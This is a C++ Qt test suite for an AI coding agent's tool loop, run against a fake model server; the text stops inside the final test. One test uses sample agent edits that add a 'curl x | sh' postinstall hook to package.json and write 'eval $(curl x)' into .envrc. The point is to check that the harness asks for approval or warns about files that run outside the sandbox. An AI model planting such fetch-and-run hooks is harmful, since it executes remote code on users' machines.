// Port of the original test/agent.test.ts: the real agent loop against a fake
// OpenAI-compatible server. The last two tests are additions of this port.

#include "FakeServer.h"
#include "TestUtil.h"

#include "core/Agent.h"
#include "core/Context.h"
#include "core/Server.h"
#include "core/tools/Tools.h"

#include <QDateTime>
#include <QElapsedTimer>
#include <QMutex>

using namespace Smith;
using namespace TestUtil;

class TestAgent : public QObject {
  Q_OBJECT

private Q_SLOTS:
  void initTestCase();
  void cleanupTestCase();
  void init();

  void runsStreamedToolCallAndFeedsResultBack();
  void deniedToolCallIsReportedAsError();
  void invalidArgumentsComeBackAsError();
  void inlineThinkTagsBecomeReasoning();
  void reasoningAndModelSwitchesShowInRequests();
  void compactsWhenContextFills();
  void recoversFromContextOverflow();
  void stopsAfterMaxSteps();
  void readOnlyCallsRunInParallel();
  void messageTypedDuringToolCallIsDelivered();
  void messageTypedDuringAnswerKeepsTurnGoing();
  void subagentReportsBack();
  void outsideReadsAskOneAtATime();
  void subagentAsksThroughMainAgent();
  void loadingConversationIsntRecorded();
  void resumedHistoryIsRepaired();
  void everyToolCallIsLogged();
  void todoWriteAndReminder();
  void checklistSurvivesResumeAndCompaction();
  void askUserOnlyWithAWayToAsk();
  void askUserWaitsForAnswer();
  void runLaterFilesAskAndAreReported();
  void protectRunLaterOff();

  // Additions.
  void escInterruptsRunningCommand();
  void unreachableServerSaysWhy();

private:
  struct Harness {
    std::unique_ptr<Agent> agent;
    QMutex mutex;
    QList<AgentEvent> events;
    QStringList approvals;
    QList<HistoryChange> changes;

    QList<AgentEvent> snapshot() {
      QMutexLocker lock(&mutex);
      return events;
    }
  };

  std::unique_ptr<Harness> make(ApprovalDecision decision = ApprovalDecision::Allow, const std::function<void(AgentOptions&, Harness&)>& extra = {});

  std::unique_ptr<FakeServer> m_pFake;
  std::unique_ptr<TempDir> m_pDir;
};

#ifndef Q_MOC_RUN

namespace {

QString textOf(const QList<AgentEvent>& events, BlockKind kind) {
  QString text;
  for (const AgentEvent& event : events) {
    if (event.type == AgentEvent::Type::Delta && event.kind == kind) {
      text += event.text;
    }
  }
  return text;
}

bool endsWithDone(const QList<AgentEvent>& events, DoneReason reason) {
  return !events.isEmpty() && events.last().type == AgentEvent::Type::Done && events.last().reason == reason;
}

bool hasNotice(const QList<AgentEvent>& events, const QString& pattern) {
  for (const AgentEvent& event : events) {
    if (event.type == AgentEvent::Type::Notice && matches(event.text, pattern)) {
      return true;
    }
  }
  return false;
}

QJsonArray messagesOf(const QJsonObject& request) {
  return request.value("messages").toArray();
}

QJsonObject lastMessage(const QJsonObject& request) {
  return messagesOf(request).last().toObject();
}

QStringList toolResults(const QJsonObject& request) {
  QStringList out;
  for (const QJsonValue& message : messagesOf(request)) {
    if (message.toObject().value("role").toString() == "tool") {
      out << message.toObject().value("content").toString();
    }
  }
  return out;
}

QStringList toolNames(const QJsonObject& request) {
  QStringList names;
  for (const QJsonValue& tool : request.value("tools").toArray()) {
    names << tool.toObject().value("function").toObject().value("name").toString();
  }
  return names;
}

Message assistantCall(const QString& id, const QString& name, const QJsonObject& args) {
  const QJsonArray calls{QJsonObject{
      {"id", id}, {"type", "function"}, {"function", QJsonObject{{"name", name}, {"arguments", QString::fromUtf8(QJsonDocument(args).toJson(QJsonDocument::Compact))}}}}};
  return Message{{"role", "assistant"}, {"content", QJsonValue::Null}, {"tool_calls", calls}};
}

Message assistant(const QString& text) {
  return Message{{"role", "assistant"}, {"content", text}};
}

QJsonArray todoArray(const QList<QPair<QString, QString>>& todos) {
  QJsonArray out;
  for (const auto& [content, status] : todos) {
    out.append(QJsonObject{{"content", content}, {"status", status}});
  }
  return out;
}

// A read-only tool that takes 200 ms to run and records when it ran.
struct Timeline {
  QMutex mutex;
  QList<std::tuple<QString, qint64, qint64>> runs;
};

ToolDef slowTool(Timeline& timeline) {
  ToolDef tool;
  tool.name = "slow";
  tool.description = "test";
  tool.schema = Schema::object({{"label", Schema::string({})}}, {"label"});
  tool.readOnly = true;
  tool.summarize = [](const QJsonObject& input) { return input.value("label").toString(); };
  tool.run = [&timeline](const QJsonObject& input, const ToolContext&) {
    const qint64 start = QDateTime::currentMSecsSinceEpoch();
    QThread::msleep(200);
    QMutexLocker lock(&timeline.mutex);
    timeline.runs.append({input.value("label").toString(), start, QDateTime::currentMSecsSinceEpoch()});
    return ToolResult{"done " + input.value("label").toString()};
  };
  return tool;
}

} // namespace

void TestAgent::initTestCase() {
  m_pFake = std::make_unique<FakeServer>();
  m_pDir = std::make_unique<TempDir>(QDir::tempPath(), "agent-loop-");
}

void TestAgent::cleanupTestCase() {
  m_pFake.reset();
  m_pDir.reset();
}

void TestAgent::init() {
  m_pFake->clearRequests();
  m_pFake->setScript({});
}

std::unique_ptr<TestAgent::Harness> TestAgent::make(ApprovalDecision decision, const std::function<void(AgentOptions&, Harness&)>& extra) {
  auto harness = std::make_unique<Harness>();
  Harness* h = harness.get();
  AgentOptions options;
  options.server = std::make_shared<Server>(m_pFake->baseUrl(), "x");
  options.model = "fake";
  options.cwd = m_pDir->path();
  options.tools = defaultTools();
  options.systemPrompt = "test";
  options.onEvent = [h](const AgentEvent& event) {
    QMutexLocker lock(&h->mutex);
    h->events.append(event);
  };
  options.onHistory = [h](const HistoryChange& change) { h->changes.append(change); };
  options.approve = [h, decision](const ApprovalRequest& request) {
    QMutexLocker lock(&h->mutex);
    h->approvals << request.summary;
    return decision;
  };
  if (extra) {
    extra(options, *h);
  }
  harness->agent = std::make_unique<Agent>(options);
  return harness;
}

void TestAgent::runsStreamedToolCallAndFeedsResultBack() {
  QList<QJsonObject> first{QJsonObject{{"reasoning_content", "I should run it."}}};
  first << FakeServer::toolCallDeltas("bash", {{"command", "echo hello"}});
  m_pFake->setScript({
      FakeServer::stream(first, "tool_calls"),
      FakeServer::stream({QJsonObject{{"content", "It printed "}}, QJsonObject{{"content", "hello."}}}, "stop"),
  });
  auto h = make();
  h->agent->send("say hello", makeCancel());

  QCOMPARE(h->approvals, QStringList({"echo hello"}));
  bool sawEnd = false;
  for (const AgentEvent& event : h->events) {
    if (event.type == AgentEvent::Type::ToolEnd) {
      QCOMPARE(event.output, QString("hello"));
      QVERIFY(!event.isError);
      sawEnd = true;
    }
  }
  QVERIFY(sawEnd);

  // The second request carries the assistant tool call, its reasoning, and the tool result.
  const QJsonArray sent = messagesOf(m_pFake->requests()[1]);
  const QJsonObject call = sent[2].toObject();
  QCOMPARE(call.value("tool_calls").toArray()[0].toObject().value("function").toObject().value("arguments").toString(), QString("{\"command\":\"echo hello\"}"));
  QCOMPARE(call.value("reasoning_content").toString(), QString("I should run it."));
  QCOMPARE(sent[3].toObject(), QJsonObject({{"role", "tool"}, {"tool_call_id", "call_1"}, {"content", "hello"}}));

  QCOMPARE(textOf(h->events, BlockKind::Text), QString("It printed hello."));
  QVERIFY(endsWithDone(h->events, DoneReason::Stop));
  QCOMPARE(h->agent->messages().size(), 5);
  // Every message after the system prompt was reported for persistence.
  QCOMPARE(h->changes.size(), 4);
  for (const HistoryChange& change : h->changes) {
    QCOMPARE(change.type, HistoryChange::Type::Append);
  }
}

void TestAgent::deniedToolCallIsReportedAsError() {
  m_pFake->setScript({
      FakeServer::stream(FakeServer::toolCallDeltas("bash", {{"command", "rm -rf build"}}), "tool_calls"),
      FakeServer::text("OK, I won't."),
  });
  auto h = make(ApprovalDecision::Deny);
  h->agent->send("clean up", makeCancel());
  const QJsonObject tool = lastMessage(m_pFake->requests()[1]);
  QCOMPARE(tool.value("role").toString(), QString("tool"));
  QVERIFY_MATCH(tool.value("content").toString(), "^Error: The user declined");
}

void TestAgent::invalidArgumentsComeBackAsError() {
  const QJsonObject delta{{"tool_calls", QJsonArray{QJsonObject{{"index", 0},
                                                                {"id", "c1"},
                                                                {"type", "function"},
                                                                {"function", QJsonObject{{"name", "read_file"}, {"arguments", "{\"file\":\"x\"}"}}}}}}};
  m_pFake->setScript({FakeServer::stream({delta}, "tool_calls"), FakeServer::text("Retrying.")});
  auto h = make();
  h->agent->send("read x", makeCancel());
  QVERIFY_MATCH(lastMessage(m_pFake->requests()[1]).value("content").toString(), "Invalid arguments[\\s\\S]*path");
}

void TestAgent::inlineThinkTagsBecomeReasoning() {
  m_pFake->setScript({FakeServer::stream(
      {QJsonObject{{"content", "<thi"}}, QJsonObject{{"content", "nk>plan it</th"}}, QJsonObject{{"content", "ink>The answer."}}}, "stop")});
  auto h = make();
  h->agent->send("q", makeCancel());
  QCOMPARE(textOf(h->events, BlockKind::Reasoning), QString("plan it"));
  QCOMPARE(textOf(h->events, BlockKind::Text), QString("The answer."));
  QCOMPARE(messageText(h->agent->messages().last()), QString("The answer."));
}

void TestAgent::reasoningAndModelSwitchesShowInRequests() {
  m_pFake->setScript({FakeServer::text("a"), FakeServer::text("b")});
  auto h = make(ApprovalDecision::Allow, [](AgentOptions& options, Harness&) { options.reasoning = "high"; });
  h->agent->send("one", makeCancel());
  h->agent->setModel("other-model", std::nullopt);
  h->agent->setReasoning("off");
  h->agent->send("two", makeCancel());

  const QJsonObject first = m_pFake->requests()[0];
  const QJsonObject second = m_pFake->requests()[1];
  QCOMPARE(first.value("reasoning_effort").toString(), QString("high"));
  QCOMPARE(first.value("chat_template_kwargs").toObject(), QJsonObject({{"enable_thinking", true}, {"reasoning_effort", "high"}}));
  QCOMPARE(second.value("model").toString(), QString("other-model"));
  QVERIFY(!second.contains("reasoning_effort"));
  QCOMPARE(second.value("chat_template_kwargs").toObject(), QJsonObject({{"enable_thinking", false}}));
}

void TestAgent::compactsWhenContextFills() {
  Messages history;
  for (int i = 0; i < 6; i++) {
    history << userMessage(QString("question %1 ").arg(i) + QString(1500, 'x'));
    history << assistant(QString("answer %1 ").arg(i) + QString(1500, 'y'));
  }
  m_pFake->setScript({FakeServer::plain("<think>hmm</think>Summary: the user asked six questions."), FakeServer::text("Done.")});
  auto h = make(ApprovalDecision::Allow, [&](AgentOptions& options, Harness&) {
    options.history = history;
    options.contextSize = 4000;
  });
  h->agent->send("latest question", makeCancel());

  // The first request is the non-streamed summary of the older messages.
  const QJsonObject summary = m_pFake->requests()[0];
  QVERIFY(!summary.contains("stream"));
  QVERIFY_MATCH(messagesOf(summary)[1].toObject().value("content").toString(), "question 0");

  // The real request starts with the summary and keeps the latest question.
  const QJsonArray sent = messagesOf(m_pFake->requests()[1]);
  QVERIFY(sent[1].toObject().value("content").toString().startsWith(SUMMARY_PREFIX + "Summary: the user asked six questions."));
  QVERIFY_MATCH(sent.last().toObject().value("content").toString(), "latest question");
  QVERIFY(sent.size() < history.size());
  bool replaced = false;
  for (const HistoryChange& change : h->changes) {
    replaced = replaced || change.type == HistoryChange::Type::Replace;
  }
  QVERIFY(replaced);
  QVERIFY(hasNotice(h->events, "Summarized"));
}

void TestAgent::recoversFromContextOverflow() {
  const QString filler(4000, 'w');
  const Messages history = {
      userMessage("first task " + filler),
      assistant("did the first task " + filler),
      userMessage("second task " + filler),
      assistant("did the second task " + filler),
  };
  m_pFake->setScript({
      FakeServer::failure(400, QJsonObject{{"code", 400},
                                           {"message", "the request exceeds the available context size, try increasing it"},
                                           {"type", "exceed_context_size_error"},
                                           {"n_prompt_tokens", 9000},
                                           {"n_ctx", 8192}}),
      FakeServer::plain("Summary of the two tasks."),
      FakeServer::text("OK."),
  });
  auto h = make(ApprovalDecision::Allow, [&](AgentOptions& options, Harness&) { options.history = history; });
  h->agent->send("third task", makeCancel());

  QCOMPARE(m_pFake->requests().size(), 3);
  QVERIFY(messagesOf(m_pFake->requests()[2])[1].toObject().value("content").toString().startsWith(SUMMARY_PREFIX));
  QVERIFY(endsWithDone(h->events, DoneReason::Stop));
  // The server's n_ctx was learned from the error.
  std::optional<int> limit;
  for (const AgentEvent& event : h->events) {
    if (event.type == AgentEvent::Type::Context) {
      limit = event.limit;
    }
  }
  QCOMPARE(limit, std::optional<int>(8192));
}

void TestAgent::stopsAfterMaxSteps() {
  // A model that keeps calling tools and never answers.
  auto glob = [](const QString& id) { return FakeServer::stream(FakeServer::toolCallDeltas("glob", {{"pattern", "*.none"}}, id), "tool_calls"); };
  m_pFake->setScript({glob("a"), glob("b"), glob("c")});
  auto h = make(ApprovalDecision::Allow, [](AgentOptions& options, Harness&) { options.maxSteps = 2; });
  h->agent->send("loop", makeCancel());

  QCOMPARE(m_pFake->requests().size(), 2);
  QVERIFY(endsWithDone(h->events, DoneReason::MaxSteps));
  QVERIFY(hasNotice(h->events, "Stopped after 2 model calls[\\s\\S]*maxSteps"));

  m_pFake->setScript({FakeServer::text("finished")});
  h->agent->send("continue", makeCancel());
  QVERIFY(endsWithDone(h->events, DoneReason::Stop));
}

void TestAgent::readOnlyCallsRunInParallel() {
  Timeline timeline;
  m_pFake->setScript({
      FakeServer::stream({FakeServer::callDelta(0, "c1", "slow", {{"label", "first"}}), FakeServer::callDelta(1, "c2", "slow", {{"label", "second"}})},
                         "tool_calls"),
      FakeServer::text("ok"),
  });
  auto h = make(ApprovalDecision::Allow, [&](AgentOptions& options, Harness&) { options.tools << slowTool(timeline); });
  h->agent->send("go", makeCancel());

  QCOMPARE(timeline.runs.size(), 2);
  const auto [nameA, startA, endA] = timeline.runs[0];
  const auto [nameB, startB, endB] = timeline.runs[1];
  QVERIFY2(startA < endB && startB < endA, "the two runs overlapped");
  QCOMPARE(toolResults(m_pFake->requests()[1]), QStringList({"done first", "done second"}));
  QCOMPARE(m_pFake->requests()[0].value("parallel_tool_calls").toBool(), true);
}

void TestAgent::messageTypedDuringToolCallIsDelivered() {
  m_pFake->setScript({
      FakeServer::stream(FakeServer::toolCallDeltas("glob", {{"pattern", "*.none"}}), "tool_calls"),
      FakeServer::text("adjusted"),
  });
  Agent* agentRef = nullptr;
  auto h = make(ApprovalDecision::Allow, [&](AgentOptions& options, Harness& harness) {
    options.onEvent = [&harness, &agentRef](const AgentEvent& event) {
      {
        QMutexLocker lock(&harness.mutex);
        harness.events.append(event);
      }
      if (event.type == AgentEvent::Type::ToolStart && agentRef) {
        agentRef->queue("actually, only look in src/");
      }
    };
  });
  agentRef = h->agent.get();
  h->agent->send("find things", makeCancel());

  const QJsonArray sent = messagesOf(m_pFake->requests()[1]);
  QCOMPARE(sent[sent.size() - 2].toObject().value("role").toString(), QString("tool"));
  QCOMPARE(sent.last().toObject(), QJsonObject({{"role", "user"}, {"content", "actually, only look in src/"}}));
  bool delivered = false;
  for (const AgentEvent& event : h->events) {
    delivered = delivered || (event.type == AgentEvent::Type::UserMessage && event.text == "actually, only look in src/");
  }
  QVERIFY(delivered);
  QVERIFY(h->agent->queuedMessages().isEmpty());
}

void TestAgent::messageTypedDuringAnswerKeepsTurnGoing() {
  m_pFake->setScript({FakeServer::text("Here is my answer."), FakeServer::text("Updated answer.")});
  Agent* agentRef = nullptr;
  bool queued = false;
  auto h = make(ApprovalDecision::Allow, [&](AgentOptions& options, Harness& harness) {
    options.onEvent = [&harness, &agentRef, &queued](const AgentEvent& event) {
      {
        QMutexLocker lock(&harness.mutex);
        harness.events.append(event);
      }
      if (event.type == AgentEvent::Type::Delta && !queued && agentRef) {
        queued = true;
        agentRef->queue("also mention the tests");
      }
    };
  });
  agentRef = h->agent.get();
  h->agent->send("answer", makeCancel());
  QCOMPARE(m_pFake->requests().size(), 2);
  QCOMPARE(lastMessage(m_pFake->requests()[1]), QJsonObject({{"role", "user"}, {"content", "also mention the tests"}}));
  QVERIFY(endsWithDone(h->events, DoneReason::Stop));
}

void TestAgent::subagentReportsBack() {
  m_pFake->setScript({
      FakeServer::stream(FakeServer::toolCallDeltas("task", {{"description", "find config"}, {"prompt", "Where is the port configured?"}}), "tool_calls"),
      // The sub-agent's own requests: it searches, then reports.
      FakeServer::stream(FakeServer::toolCallDeltas("grep", {{"pattern", "port"}}, "s1"), "tool_calls"),
      FakeServer::text("The port is set in config/server.ts:12."),
      FakeServer::text("It's in config/server.ts."),
  });
  auto h = make(ApprovalDecision::Allow, [](AgentOptions& options, Harness&) { options.subagentPrompt = "SUBAGENT PROMPT"; });
  h->agent->send("where is the port set?", makeCancel());

  const QJsonObject child = m_pFake->requests()[1];
  QCOMPARE(messagesOf(child)[0].toObject().value("content").toString(), QString("SUBAGENT PROMPT"));
  QCOMPARE(messagesOf(child).size(), 2);
  QCOMPARE(messagesOf(child)[1].toObject(), QJsonObject(userMessage("Where is the port configured?")));
  QStringList childTools = toolNames(child);
  childTools.sort();
  QVERIFY2(childTools == QStringList({"glob", "grep", "list_files", "read_file"}), "read-only tools only, no nested task tool");

  const QJsonObject parentAfter = m_pFake->requests()[3];
  QCOMPARE(lastMessage(parentAfter).value("content").toString(), QString("The port is set in config/server.ts:12."));
  QVERIFY2(!QJsonDocument(parentAfter).toJson().contains("s1"), "the sub-agent's own tool calls stay out of the main conversation");
  bool activity = false;
  for (const AgentEvent& event : h->events) {
    activity = activity || (event.type == AgentEvent::Type::Activity && matches(event.text, "find config › grep"));
  }
  QVERIFY(activity);
}

void TestAgent::outsideReadsAskOneAtATime() {
  write(m_pDir->file("inside.txt"), "in\n");
  m_pFake->setScript({
      FakeServer::stream({FakeServer::callDelta(0, "r1", "read_file", {{"path", "inside.txt"}}),
                          FakeServer::callDelta(1, "r2", "read_file", {{"path", "/etc/hostname"}}),
                          FakeServer::callDelta(2, "r3", "read_file", {{"path", "/etc/os-release"}})},
                         "tool_calls"),
      FakeServer::text("read them"),
  });
  QMutex mutex;
  QList<QPair<QString, QString>> asked;
  int open = 0;
  bool overlapped = false;
  auto h = make(ApprovalDecision::Allow, [&](AgentOptions& options, Harness&) {
    options.approve = [&](const ApprovalRequest& request) {
      {
        QMutexLocker lock(&mutex);
        overlapped = overlapped || open > 0;
        open++;
        asked.append({request.summary, request.note});
      }
      QThread::msleep(50);
      QMutexLocker lock(&mutex);
      open--;
      return ApprovalDecision::AllowAlways;
    };
  });
  h->agent->send("read", makeCancel());

  // The two outside reads resolve their paths in parallel, so either may ask first.
  QVERIFY2(asked.size() == 1, "asked once, then always-allowed");
  QVERIFY_MATCH(asked[0].first, "^/etc/(hostname|os-release)$");
  QCOMPARE(asked[0].second, QString("Reads outside the project folder."));
  QVERIFY(!overlapped);
  const QStringList results = toolResults(m_pFake->requests()[1]);
  QVERIFY_MATCH(results[0], "^1\\tin");
  for (const QString& result : results) {
    QVERIFY2(!result.startsWith("Error"), qPrintable(result));
  }
}

void TestAgent::subagentAsksThroughMainAgent() {
  m_pFake->setScript({
      FakeServer::stream(FakeServer::toolCallDeltas("task", {{"description", "check hosts"}, {"prompt", "Read /etc/hostname"}}), "tool_calls"),
      FakeServer::stream({FakeServer::callDelta(0, "s1", "read_file", {{"path", "/etc/hostname"}})}, "tool_calls"),
      FakeServer::text("hostname read"),
      FakeServer::text("done"),
  });
  QStringList notes;
  auto h = make(ApprovalDecision::Allow, [&](AgentOptions& options, Harness&) {
    options.subagentPrompt = "SUB";
    options.approve = [&](const ApprovalRequest& request) {
      notes << request.note;
      return ApprovalDecision::Deny;
    };
  });
  h->agent->send("go", makeCancel());
  QCOMPARE(notes, QStringList({"Sub-agent \"check hosts\": Reads outside the project folder."}));
  QVERIFY_MATCH(lastMessage(m_pFake->requests()[2]).value("content").toString(), "^Error: The user declined");
}

void TestAgent::loadingConversationIsntRecorded() {
  auto h = make();
  h->agent->loadConversation({userMessage("earlier"), assistant("reply")});
  const Messages messages = h->agent->messages();
  QCOMPARE(messages.size(), 3);
  QCOMPARE(messageText(messages[1]), QString("earlier"));
  QCOMPARE(messageText(messages[2]), QString("reply"));
  QVERIFY(h->changes.isEmpty());
  QVERIFY(!h->agent->canUndo());
}

void TestAgent::resumedHistoryIsRepaired() {
  const Messages history = {userMessage("do it"), assistantCall("t1", "bash", {{"command", "ls"}})};
  m_pFake->setScript({FakeServer::text("Continuing.")});
  auto h = make(ApprovalDecision::Allow, [&](AgentOptions& options, Harness&) { options.history = history; });
  h->agent->send("go on", makeCancel());
  const QJsonObject repaired = messagesOf(m_pFake->requests()[0])[3].toObject();
  QCOMPARE(repaired.value("role").toString(), QString("tool"));
  QCOMPARE(repaired.value("tool_call_id").toString(), QString("t1"));
}

void TestAgent::everyToolCallIsLogged() {
  QMutex mutex;
  QList<ToolRun> runs;
  m_pFake->setScript({
      FakeServer::stream({FakeServer::callDelta(0, "t0", "bash", {{"command", "echo logged"}}), FakeServer::callDelta(1, "t1", "no_such_tool", {}),
                          FakeServer::callDelta(2, "t2", "glob", {{"pattern", "*.nothing"}})},
                         "tool_calls"),
      FakeServer::stream(FakeServer::toolCallDeltas("bash", {{"command", "echo refused"}}), "tool_calls"),
      FakeServer::stream(FakeServer::toolCallDeltas("task", {{"description", "look"}, {"prompt", "look around"}}), "tool_calls"),
      // The sub-agent's call, then its report, then the parent's answer.
      FakeServer::stream(FakeServer::toolCallDeltas("glob", {{"pattern", "*.md"}}, "s1"), "tool_calls"),
      FakeServer::text("nothing here"),
      FakeServer::text("done"),
  });
  QList<ApprovalDecision> decisions{ApprovalDecision::Allow, ApprovalDecision::Deny};
  auto h = make(ApprovalDecision::Allow, [&](AgentOptions& options, Harness&) {
    options.approve = [&](const ApprovalRequest&) { return decisions.takeFirst(); };
    options.onToolRun = [&](const ToolRun& run) {
      QMutexLocker lock(&mutex);
      runs.append(run);
    };
    options.subagentPrompt = "SUB";
  });
  h->agent->send("go", makeCancel());

  QStringList shown;
  for (const ToolRun& run : runs) {
    shown << QStringList{run.tool, run.status, run.approval, run.subagent}.join('|');
  }
  QCOMPARE(shown, QStringList({
                      "bash|ok|allowed|",
                      "no_such_tool|invalid||",
                      "glob|ok|not needed|",
                      "bash|denied|denied|",
                      "glob|ok|not needed|look",
                      "task|ok|not needed|",
                  }));
  QCOMPARE(runs[0].input.toObject(), QJsonObject({{"command", "echo logged"}}));
  QCOMPARE(runs[0].output, QString("logged"));
  QCOMPARE(runs[5].output, QString("nothing here"));
  for (const ToolRun& run : runs) {
    QVERIFY(QDateTime::fromString(run.time, Qt::ISODateWithMs).isValid() && run.durationMs >= 0);
  }
}

void TestAgent::todoWriteAndReminder() {
  auto todoCall = [](const QList<QPair<QString, QString>>& todos, const QString& id = "todo1") {
    return FakeServer::stream(FakeServer::toolCallDeltas("todo_write", {{"todos", todoArray(todos)}}, id), "tool_calls");
  };
  m_pFake->setScript({
      todoCall({{"Read the code", "in_progress"}, {"Fix the bug", "pending"}}),
      // Stops with steps left: reminded.
      FakeServer::text("I looked at it."),
      todoCall({{"Read the code", "completed"}, {"Fix the bug", "in_progress"}}, "todo2"),
      // Stops again: not reminded twice in one turn.
      FakeServer::text("Still on it."),
  });
  auto h = make();
  h->agent->send("fix it", makeCancel());

  QCOMPARE(m_pFake->requests().size(), 4);
  const QJsonObject reminder = lastMessage(m_pFake->requests()[2]);
  QCOMPARE(reminder.value("role").toString(), QString("user"));
  QVERIFY_MATCH(reminder.value("content").toString(), "^\\[Reminder\\] Your todo list still has unfinished steps:\\n\\[>\\] Read the code\\n\\[ \\] Fix the bug");
  QVERIFY_MATCH(lastMessage(m_pFake->requests()[1]).value("content").toString(), "Todo list updated \\(0/2 done\\)");
  const TodoList todos = h->agent->todos();
  QCOMPARE(todos.size(), 2);
  QCOMPARE(todos[0].status, TodoStatus::Completed);
  QCOMPARE(todos[1].status, TodoStatus::InProgress);
  int todoEvents = 0;
  for (const AgentEvent& event : h->events) {
    todoEvents += event.type == AgentEvent::Type::Todos ? 1 : 0;
  }
  QCOMPARE(todoEvents, 2);
  QVERIFY(hasNotice(h->events, "Reminded the agent of 2 unfinished todos"));
}

void TestAgent::checklistSurvivesResumeAndCompaction() {
  const QJsonArray todos = todoArray({{"Write tests", "completed"}, {"Ship it", "pending"}});
  Messages history = {
      userMessage("plan it"),
      assistantCall("t1", "todo_write", {{"todos", todos}}),
      toolMessage("t1", "Todo list updated"),
      assistant("Planned."),
  };
  // Long enough that the start gets summarized.
  for (int i = 0; i < 4; i++) {
    history << userMessage(QString(1500, 'x')) << assistant(QString(1500, 'y'));
  }
  auto h = make(ApprovalDecision::Allow, [&](AgentOptions& options, Harness&) {
    options.history = history;
    options.contextSize = 4000;
  });
  const TodoList loaded = h->agent->todos();
  QCOMPARE(loaded, TodoList({Todo{"Write tests", TodoStatus::Completed}, Todo{"Ship it", TodoStatus::Pending}}));

  m_pFake->setScript({FakeServer::plain("We planned the work.")});
  h->agent->compactNow(makeCancel());
  QVERIFY_MATCH(messageText(h->agent->messages()[1]), "Your todo list so far:\\n\\[x\\] Write tests\\n\\[ \\] Ship it");
}

void TestAgent::askUserOnlyWithAWayToAsk() {
  m_pFake->setScript({FakeServer::text("hi")});
  make()->agent->send("hi", makeCancel());
  QVERIFY(toolNames(m_pFake->requests()[0]).contains("todo_write"));
  QVERIFY(!toolNames(m_pFake->requests()[0]).contains("ask_user"));

  m_pFake->setScript({FakeServer::text("hi")});
  make(ApprovalDecision::Allow, [](AgentOptions& options, Harness&) { options.ask = [](const Question&) { return Answer{}; }; })
      ->agent->send("hi", makeCancel());
  QVERIFY(toolNames(m_pFake->requests()[1]).contains("ask_user"));
}

void TestAgent::askUserWaitsForAnswer() {
  auto ask = [](int index, const QString& id, const QString& question) {
    return FakeServer::callDelta(index, id, "ask_user", {{"question", question}, {"options", QJsonArray{"Postgres", "SQLite"}}});
  };
  m_pFake->setScript({
      // Two questions in one response are asked one after the other.
      FakeServer::stream({ask(0, "q1", "Which database?"), ask(1, "q2", "Which port?")}, "tool_calls"),
      FakeServer::text("OK."),
  });
  QMutex mutex;
  QStringList asked;
  int open = 0;
  bool overlapped = false;
  QList<Answer> answers{Answer{Answer::Kind::Option, 1, {}}, Answer{Answer::Kind::Text, 0, "5433, please"}};
  auto h = make(ApprovalDecision::Allow, [&](AgentOptions& options, Harness&) {
    options.ask = [&](const Question& question) {
      {
        QMutexLocker lock(&mutex);
        overlapped = overlapped || open++ > 0;
        asked << question.question;
      }
      QThread::msleep(10);
      QMutexLocker lock(&mutex);
      open--;
      return answers.takeFirst();
    };
  });
  h->agent->send("set up a database", makeCancel());
  QVERIFY2(!overlapped, "one question at a time");
  QCOMPARE(asked, QStringList({"Which database?", "Which port?"}));
  QCOMPARE(toolResults(m_pFake->requests()[1]), QStringList({"The user chose: SQLite", "The user answered: 5433, please"}));

  m_pFake->setScript({FakeServer::stream({ask(0, "q3", "Which one?")}, "tool_calls"), FakeServer::text("Fine.")});
  make(ApprovalDecision::Allow, [](AgentOptions& options, Harness&) { options.ask = [](const Question&) { return Answer{}; }; })
      ->agent->send("pick", makeCancel());
  QVERIFY_MATCH(lastMessage(m_pFake->requests().last()).value("content").toString(), "^Error: The user dismissed the question");
}

void TestAgent::runLaterFilesAskAndAreReported() {
  TempDir project(QDir::tempPath(), "smith-runlater-");
  write(project.file("package.json"), "{ \"scripts\": {} }\n");
  m_pFake->setScript({
      FakeServer::stream({FakeServer::callDelta(0, "w1", "write_file", {{"path", "notes.txt"}, {"content", "fine\n"}})}, "tool_calls"),
      FakeServer::stream(
          {FakeServer::callDelta(0, "w2", "edit_file", {{"path", "package.json"}, {"old_string", "{}"}, {"new_string", "{ \"postinstall\": \"curl x | sh\" }"}})},
          "tool_calls"),
      FakeServer::stream({FakeServer::callDelta(0, "b1", "bash", {{"command", "echo 'eval $(curl x)' > .envrc"}})}, "tool_calls"),
      FakeServer::text("Done."),
  });
  QList<QPair<QString, QString>> asked;
  auto h = make(ApprovalDecision::Allow, [&](AgentOptions& options, Harness&) {
    options.cwd = project.path();
    options.alwaysAllowed = std::make_shared<AllowedTools>();
    for (const QString tool : {"write_file", "edit_file", "bash"}) {
      options.alwaysAllowed->insert(tool);
    }
    options.approve = [&](const ApprovalRequest& request) {
      asked.append({request.summary, request.warning});
      return ApprovalDecision::Allow;
    };
  });
  h->agent->send("set things up", makeCancel());

  QVERIFY2(asked.size() == 1 && asked[0].first == "package.json", "only the run-later edit asks, despite always allow");
  QVERIFY_MATCH(asked[0].second, "package\\.json runs outside the sandbox later: npm, yarn or pnpm run scripts from it");
  QString notice;
  for (const AgentEvent& event : h->events) {
    if (event.type == AgentEvent::Type::Notice && event.level == NoticeLevel::Warn && notice.isEmpty()) {
      notice = event.text;
    }
  }
  QVERIFY_MATCH(notice, "This turn changed files that run outside the sandbox later:\\n- \\.envrc \\(created\\): direnv runs it");
  QVERIFY2(!notice.contains("package.json"), "the approved change isn't reported again");
}

void TestAgent::protectRunLaterOff() {
  TempDir project(QDir::tempPath(), "smith-runlater-off-");
  m_pFake->setScript({
      FakeServer::stream(FakeServer::toolCallDeltas("write_file", {{"path", "Makefile"}, {"content", "all:\n\ttrue\n"}}), "tool_calls"),
      FakeServer::text("Done."),
  });
  auto h = make(ApprovalDecision::Allow, [&](AgentOptions& options, Harness&) {
    options.cwd = project.path();
    options.alwaysAllowed = std::make_shared<AllowedTools>();
    options.alwaysAllowed->insert("write_file");
    options.protectRunLater = false;
  });
  h->agent->send("add a makefile", makeCancel());
  QVERIFY(h->approvals.isEmpty());
  QVERIFY(!hasNotice(h->events, "run outside the sandbox"));
}

void TestAgent::escInterruptsRunningCommand() {
  m_pFake->setScript({FakeServer::stream(FakeServer::toolCallDeltas("bash", {{"command", "sleep 30"}}), "tool_calls")});
  auto h = make();
  const CancelPtr cancel = makeCancel();
  QThread* worker = QThread::create([&]() { h->agent->send("wait", cancel); });
  QElapsedTimer clock;
  clock.start();
  worker->start();
  QThread::msleep(500);
  cancel->cancel();
  worker->wait();
  delete worker;
  QVERIFY(clock.elapsed() < 10000);
  QVERIFY(endsWithDone(h->snapshot(), DoneReason::Interrupted));
  // The interrupted call still got a result, so the history stays valid.
  QCOMPARE(messageRole(h->agent->messages().last()), QString("tool"));
  QVERIFY_MATCH(messageText(h->agent->messages().last()), "interrupted by the user");
}

void TestAgent::unreachableServerSaysWhy() {
